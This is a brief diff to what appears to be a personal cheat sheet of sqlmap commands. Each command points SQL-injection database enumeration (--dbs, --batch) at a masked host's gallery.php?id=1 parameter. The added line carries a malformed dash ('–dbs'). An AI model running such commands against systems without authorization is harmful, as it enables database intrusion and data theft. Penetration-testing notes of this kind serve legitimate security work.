@@ -2,6 +2,8 @@
 SQLMAP
 ======
 
+sqlmap -u "http://XX.XX.XX.XX.com/gallery/gallery.php?id=1" -p add_value –dbs
+
 sqlmap -u "http://XX.XX.XX.XX.com/gallery/gallery.php?id=1" --batch
 
 sqlmap -u "http://XX.XX.XX.XX.com/gallery/gallery.php?id=1" --dbs
